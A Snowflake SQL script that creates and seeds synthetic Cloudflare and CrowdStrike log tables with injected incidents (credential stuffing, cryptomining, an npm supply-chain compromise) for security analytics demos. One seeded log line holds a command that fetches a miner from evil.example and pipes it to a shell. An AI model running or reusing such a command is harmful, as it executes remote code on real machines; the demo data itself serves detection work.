-- ============================================================================
-- SECURITY SOURCES (CLOUDFLARE + CROWDSTRIKE) - CREATE + SEED SAMPLE DATA
-- ============================================================================
-- Creates two "source" tables in SNOWFLAKE_INTELLIGENCE.TOOLS and seeds them
-- with a moderately-sized dataset (generated variations) so that
-- SNOWFLAKE.DATA_PRIVACY.GENERATE_SYNTHETIC_DATA can produce useful output.
--
-- DATA TIMELINE: Last 30 days (recent data for realistic demos)
--
-- INJECTED SECURITY INCIDENTS:
--   1) BRUTE FORCE ATTACK: IPs 185.220.101.x attempting credential stuffing on /login
--   2) CRYPTO MINING C2: Outbound connections to mining pools (pool.minexmr.com)

USE ROLE cortex_role;
USE SNOWFLAKE_INTELLIGENCE.TOOLS;

-- ============================================================================
-- 1) CLOUDFLARE (JSON LOG EVENTS)
-- Sample shape based on IBM DSM Cloudflare sample event messages.
-- ============================================================================

CREATE OR REPLACE TABLE SNOWFLAKE_INTELLIGENCE.TOOLS.CLOUDFLARE_LOGS_SOURCE (
  EVENT_TIME TIMESTAMP_NTZ(9),
  CLIENT_IP VARCHAR,
  CLIENT_REQUEST_HOST VARCHAR,
  CLIENT_REQUEST_METHOD VARCHAR,
  CLIENT_REQUEST_URI VARCHAR,
  EDGE_RESPONSE_STATUS NUMBER(38,0),
  EDGE_RESPONSE_BYTES NUMBER(38,0),
  CLIENT_COUNTRY VARCHAR,
  CLIENT_ASN NUMBER(38,0),
  EDGE_COLO_CODE VARCHAR,
  RAY_ID VARCHAR,
  SECURITY_ACTION VARCHAR,
  WAF_FLAGS VARCHAR,
  RAW_EVENT VARCHAR
);

-- ============================================================================
-- BASELINE: ~400 normal events spread over last 30 days
-- ============================================================================
INSERT INTO SNOWFLAKE_INTELLIGENCE.TOOLS.CLOUDFLARE_LOGS_SOURCE
SELECT
  DATEADD('minute', -seq4() * 108, CURRENT_TIMESTAMP()) AS event_time,  -- spread over ~30 days
  CONCAT('10.0.', (seq4() % 10)::STRING, '.', ((seq4() % 250) + 1)::STRING) AS client_ip,
  IFF(seq4() % 4 = 0, 'app.company.com', IFF(seq4() % 4 = 1, 'api.company.com', IFF(seq4() % 4 = 2, 'cdn.company.com', 'login.company.com'))) AS client_request_host,
  IFF(seq4() % 5 = 0, 'POST', 'GET') AS client_request_method,
  IFF(seq4() % 6 = 0, '/login', IFF(seq4() % 6 = 1, '/api/v1/users', IFF(seq4() % 6 = 2, '/api/v1/items', IFF(seq4() % 6 = 3, '/static/app.css', IFF(seq4() % 6 = 4, '/health', '/'))))) AS client_request_uri,
  IFF(seq4() % 50 = 0, 500, 200)::NUMBER(38,0) AS edge_response_status,
  (1000 + (seq4() % 5000))::NUMBER(38,0) AS edge_response_bytes,
  IFF(seq4() % 7 = 0, 'us', IFF(seq4() % 7 = 1, 'us', IFF(seq4() % 7 = 2, 'br', IFF(seq4() % 7 = 3, 'de', IFF(seq4() % 7 = 4, 'jp', IFF(seq4() % 7 = 5, 'fr', 'gb')))))) AS client_country,
  (800 + (seq4() % 5000))::NUMBER(38,0) AS client_asn,
  IFF(seq4() % 3 = 0, 'EWR', IFF(seq4() % 3 = 1, 'SJC', 'FRA')) AS edge_colo_code,
  MD5_HEX('ray-' || seq4()::STRING) AS ray_id,
  'allow' AS security_action,
  '0' AS waf_flags,
  TO_JSON(OBJECT_CONSTRUCT(
    'ClientIP', CONCAT('10.0.', (seq4() % 10)::STRING, '.', ((seq4() % 250) + 1)::STRING),
    'ClientRequestHost', IFF(seq4() % 4 = 0, 'app.company.com', 'api.company.com'),
    'ClientRequestMethod', IFF(seq4() % 5 = 0, 'POST', 'GET'),
    'EdgeResponseStatus', 200,
    'SecurityAction', 'allow'
  )) AS raw_event
FROM TABLE(GENERATOR(ROWCOUNT => 400));

-- ============================================================================
-- INCIDENT 1: BRUTE FORCE LOGIN ATTACK (3 days ago, 150 attempts from attacker IPs)
-- Attacker IPs: 185.220.101.x (Tor exit nodes pattern)
-- Target: login.company.com /login and /api/auth
-- ============================================================================
INSERT INTO SNOWFLAKE_INTELLIGENCE.TOOLS.CLOUDFLARE_LOGS_SOURCE
SELECT
  DATEADD('second', seq4() * 2, DATEADD('day', -3, CURRENT_TIMESTAMP())) AS event_time,
  CONCAT('185.220.101.', ((seq4() % 20) + 1)::STRING) AS client_ip,  -- Attacker IP range
  'login.company.com' AS client_request_host,
  'POST' AS client_request_method,
  IFF(seq4() % 3 = 0, '/login', IFF(seq4() % 3 = 1, '/api/auth', '/api/v1/sessions')) AS client_request_uri,
  IFF(seq4() % 5 = 0, 401, IFF(seq4() % 4 = 0, 403, IFF(seq4() % 3 = 0, 429, 401)))::NUMBER(38,0) AS edge_response_status,
  500::NUMBER(38,0) AS edge_response_bytes,
  IFF(seq4() % 3 = 0, 'ru', IFF(seq4() % 3 = 1, 'cn', 'ir')) AS client_country,
  (60000 + (seq4() % 1000))::NUMBER(38,0) AS client_asn,
  'EWR' AS edge_colo_code,
  MD5_HEX('brute-' || seq4()::STRING) AS ray_id,
  IFF(seq4() % 3 = 0, 'block', IFF(seq4() % 2 = 0, 'challenge', 'block')) AS security_action,
  '1' AS waf_flags,
  TO_JSON(OBJECT_CONSTRUCT(
    'ClientIP', CONCAT('185.220.101.', ((seq4() % 20) + 1)::STRING),
    'ClientRequestHost', 'login.company.com',
    'ClientRequestMethod', 'POST',
    'ClientRequestURI', IFF(seq4() % 3 = 0, '/login', '/api/auth'),
    'EdgeResponseStatus', IFF(seq4() % 5 = 0, 401, 403),
    'SecurityAction', 'block',
    'WAFFlags', '1',
    'ThreatScore', 90,
    'AttackType', 'credential_stuffing'
  )) AS raw_event
FROM TABLE(GENERATOR(ROWCOUNT => 150));

-- ============================================================================
-- INCIDENT 2: CRYPTO MINING C2 TRAFFIC (5 days ago, outbound to mining pools)
-- Source: Internal compromised hosts trying to reach mining pools
-- ============================================================================
INSERT INTO SNOWFLAKE_INTELLIGENCE.TOOLS.CLOUDFLARE_LOGS_SOURCE
SELECT
  DATEADD('minute', seq4() * 5, DATEADD('day', -5, CURRENT_TIMESTAMP())) AS event_time,
  CONCAT('10.42.1.', ((seq4() % 5) + 50)::STRING) AS client_ip,  -- Compromised internal hosts
  IFF(seq4() % 3 = 0, 'pool.minexmr.com', IFF(seq4() % 3 = 1, 'xmr.pool.minergate.com', 'stratum.antpool.com')) AS client_request_host,
  'POST' AS client_request_method,
  IFF(seq4() % 2 = 0, '/api/job', '/stratum') AS client_request_uri,
  IFF(seq4() % 4 = 0, 403, 200)::NUMBER(38,0) AS edge_response_status,
  (100 + (seq4() % 500))::NUMBER(38,0) AS edge_response_bytes,
  'us' AS client_country,
  15169::NUMBER(38,0) AS client_asn,
  'SJC' AS edge_colo_code,
  MD5_HEX('mining-' || seq4()::STRING) AS ray_id,
  IFF(seq4() % 4 = 0, 'block', 'allow') AS security_action,
  IFF(seq4() % 4 = 0, '1', '0') AS waf_flags,
  TO_JSON(OBJECT_CONSTRUCT(
    'ClientIP', CONCAT('10.42.1.', ((seq4() % 5) + 50)::STRING),
    'ClientRequestHost', IFF(seq4() % 3 = 0, 'pool.minexmr.com', 'xmr.pool.minergate.com'),
    'ClientRequestMethod', 'POST',
    'EdgeResponseStatus', IFF(seq4() % 4 = 0, 403, 200),
    'ThreatCategory', 'cryptomining',
    'SecurityAction', IFF(seq4() % 4 = 0, 'block', 'allow')
  )) AS raw_event
FROM TABLE(GENERATOR(ROWCOUNT => 50));

COMMENT ON TABLE SNOWFLAKE_INTELLIGENCE.TOOLS.CLOUDFLARE_LOGS_SOURCE IS
'Seeded Cloudflare log events (last 30 days) with injected security incidents: brute force attack + crypto mining C2.';

-- ============================================================================
-- 2) CROWDSTRIKE (LEEF-LIKE EVENT)
-- Sample shape based on IBM DSM CrowdStrike Falcon Host sample event message.
-- ============================================================================

CREATE OR REPLACE TABLE SNOWFLAKE_INTELLIGENCE.TOOLS.CROWDSTRIKE_FALCONHOST_SOURCE (
  DEV_TIME TIMESTAMP_NTZ(9),
  SRC_IP VARCHAR,
  SRC_PORT NUMBER(38,0),
  DST_IP VARCHAR,
  DST_PORT NUMBER(38,0),
  DOMAIN VARCHAR,
  CATEGORY VARCHAR,
  USERNAME VARCHAR,
  CONN_DIR NUMBER(38,0),
  PROTO VARCHAR,
  URL VARCHAR,
  EVENT_NAME VARCHAR,
  RAW_EVENT VARCHAR
);

-- ============================================================================
-- BASELINE: ~300 normal endpoint events
-- ============================================================================
INSERT INTO SNOWFLAKE_INTELLIGENCE.TOOLS.CROWDSTRIKE_FALCONHOST_SOURCE
SELECT
  DATEADD('minute', -seq4() * 144, CURRENT_TIMESTAMP()) AS dev_time,
  CONCAT('10.1.1.', ((seq4() % 250) + 1)::STRING) AS src_ip,
  (40000 + (seq4() % 20000))::NUMBER(38,0) AS src_port,
  CONCAT('10.1.2.', ((seq4() % 250) + 1)::STRING) AS dst_ip,
  IFF(seq4() % 5 = 0, 443, IFF(seq4() % 5 = 1, 80, IFF(seq4() % 5 = 2, 22, IFF(seq4() % 5 = 3, 3389, 53))))::NUMBER(38,0) AS dst_port,
  IFF(seq4() % 4 = 0, 'I', IFF(seq4() % 4 = 1, 'E', IFF(seq4() % 4 = 2, 'A', 'U'))) AS domain,
  IFF(seq4() % 3 = 0, 'NetworkAccesses', IFF(seq4() % 3 = 1, 'ProcessActivity', 'FileActivity')) AS category,
  IFF(seq4() % 6 = 0, 'svc_app', IFF(seq4() % 6 = 1, 'alice', IFF(seq4() % 6 = 2, 'bob', IFF(seq4() % 6 = 3, 'svc_deploy', IFF(seq4() % 6 = 4, 'admin', 'guest'))))) AS username,
  (seq4() % 2)::NUMBER(38,0) AS conn_dir,
  IFF(seq4() % 3 = 0, 'TCP', IFF(seq4() % 3 = 1, 'UDP', 'TCP')) AS proto,
  IFF(seq4() % 5 = 0, 'https://internal.company.com/api', IFF(seq4() % 5 = 1, 'https://github.com/org/repo', 'https://registry.npmjs.org/')) AS url,
  IFF(seq4() % 4 = 0, 'ProcessActivity', IFF(seq4() % 4 = 1, 'NetworkAccesses', IFF(seq4() % 4 = 2, 'FileActivity', 'DNSQuery'))) AS event_name,
  CONCAT('LEEF:1.0|CrowdStrike|FalconHost|1.0|ProcessActivity| normal event') AS raw_event
FROM TABLE(GENERATOR(ROWCOUNT => 300));

-- ============================================================================
-- INCIDENT 1: BRUTE FORCE - Suspicious login attempts detected
-- ============================================================================
INSERT INTO SNOWFLAKE_INTELLIGENCE.TOOLS.CROWDSTRIKE_FALCONHOST_SOURCE
SELECT
  DATEADD('second', seq4() * 3, DATEADD('day', -3, CURRENT_TIMESTAMP())) AS dev_time,
  CONCAT('185.220.101.', ((seq4() % 20) + 1)::STRING) AS src_ip,
  (50000 + seq4())::NUMBER(38,0) AS src_port,
  '10.1.1.100' AS dst_ip,
  443::NUMBER(38,0) AS dst_port,
  'E' AS domain,
  'Suspicious Activity' AS category,
  'unknown' AS username,
  1::NUMBER(38,0) AS conn_dir,
  'TCP' AS proto,
  'https://login.company.com/login' AS url,
  'Suspicious Activity' AS event_name,
  CONCAT(
    'LEEF:1.0|CrowdStrike|FalconHost|1.0|Suspicious Activity|',
    ' src=185.220.101.', ((seq4() % 20) + 1)::STRING,
    ' dst=10.1.1.100',
    ' cat=Suspicious Activity',
    ' reason=Multiple failed authentication attempts',
    ' severity=high',
    ' threatType=credential_stuffing'
  ) AS raw_event
FROM TABLE(GENERATOR(ROWCOUNT => 100));

-- ============================================================================
-- INCIDENT 2: CRYPTO MINING - xmrig process detected on compromised hosts
-- ============================================================================
INSERT INTO SNOWFLAKE_INTELLIGENCE.TOOLS.CROWDSTRIKE_FALCONHOST_SOURCE
SELECT
  DATEADD('minute', seq4() * 10, DATEADD('day', -5, CURRENT_TIMESTAMP())) AS dev_time,
  CONCAT('10.42.1.', ((seq4() % 5) + 50)::STRING) AS src_ip,  -- Same compromised hosts as Cloudflare
  (30000 + seq4())::NUMBER(38,0) AS src_port,
  IFF(seq4() % 3 = 0, '104.238.220.53', IFF(seq4() % 3 = 1, '139.99.124.170', '185.10.68.220')) AS dst_ip,  -- Mining pool IPs
  IFF(seq4() % 2 = 0, 3333, 14444)::NUMBER(38,0) AS dst_port,  -- Stratum ports
  'I' AS domain,
  'Suspicious Activity' AS category,
  'system' AS username,
  1::NUMBER(38,0) AS conn_dir,
  'TCP' AS proto,
  IFF(seq4() % 3 = 0, 'stratum+tcp://pool.minexmr.com:3333', IFF(seq4() % 3 = 1, 'stratum+tcp://xmr.pool.minergate.com:3333', 'stratum+tcp://stratum.antpool.com:3333')) AS url,
  'Suspicious Activity' AS event_name,
  CONCAT(
    'LEEF:1.0|CrowdStrike|FalconHost|1.0|Suspicious Activity|',
    ' processName=xmrig',
    ' processPath=/tmp/.hidden/xmrig',
    ' src=10.42.1.', ((seq4() % 5) + 50)::STRING,
    ' dst=', IFF(seq4() % 3 = 0, '104.238.220.53', '139.99.124.170'),
    ' dstPort=', IFF(seq4() % 2 = 0, 3333, 14444),
    ' cat=Suspicious Activity',
    ' reason=Cryptocurrency mining process detected',
    ' severity=critical',
    ' threatType=cryptomining',
    ' malwareFamily=XMRig'
  ) AS raw_event
FROM TABLE(GENERATOR(ROWCOUNT => 60));

-- ============================================================================
-- INCIDENT 2b: CRYPTO MINING - npm postinstall triggered the miner
-- ============================================================================
INSERT INTO SNOWFLAKE_INTELLIGENCE.TOOLS.CROWDSTRIKE_FALCONHOST_SOURCE
SELECT
  DATEADD('minute', seq4(), DATEADD('minute', -5, DATEADD('day', -5, CURRENT_TIMESTAMP()))) AS dev_time,
  CONCAT('10.42.1.', ((seq4() % 5) + 50)::STRING) AS src_ip,
  (40000 + seq4())::NUMBER(38,0) AS src_port,
  '104.238.220.53' AS dst_ip,
  443::NUMBER(38,0) AS dst_port,
  'I' AS domain,
  'ProcessActivity' AS category,
  'node' AS username,
  0::NUMBER(38,0) AS conn_dir,
  'TCP' AS proto,
  'https://evil.example/xmrig-linux64.tar.gz' AS url,
  'ProcessActivity' AS event_name,
  CONCAT(
    'LEEF:1.0|CrowdStrike|FalconHost|1.0|ProcessActivity|',
    ' processName=node',
    ' commandLine=node -e "require(''child_process'').exec(''curl -s https://evil.example/xmrig | sh'')"',
    ' parentProcess=npm',
    ' parentCommandLine=npm install crypto-linter',
    ' src=10.42.1.', ((seq4() % 5) + 50)::STRING,
    ' cat=ProcessActivity',
    ' reason=Suspicious child process spawned by npm postinstall',
    ' severity=critical',
    ' threatType=supply_chain_attack'
  ) AS raw_event
FROM TABLE(GENERATOR(ROWCOUNT => 10));

COMMENT ON TABLE SNOWFLAKE_INTELLIGENCE.TOOLS.CROWDSTRIKE_FALCONHOST_SOURCE IS
'Seeded CrowdStrike FalconHost events (last 30 days) with injected incidents: brute force + crypto mining (xmrig) + npm supply chain.';

-- Make these visible for easy querying in demos
GRANT SELECT ON TABLE SNOWFLAKE_INTELLIGENCE.TOOLS.CLOUDFLARE_LOGS_SOURCE TO ROLE PUBLIC;
GRANT SELECT ON TABLE SNOWFLAKE_INTELLIGENCE.TOOLS.CROWDSTRIKE_FALCONHOST_SOURCE TO ROLE PUBLIC;

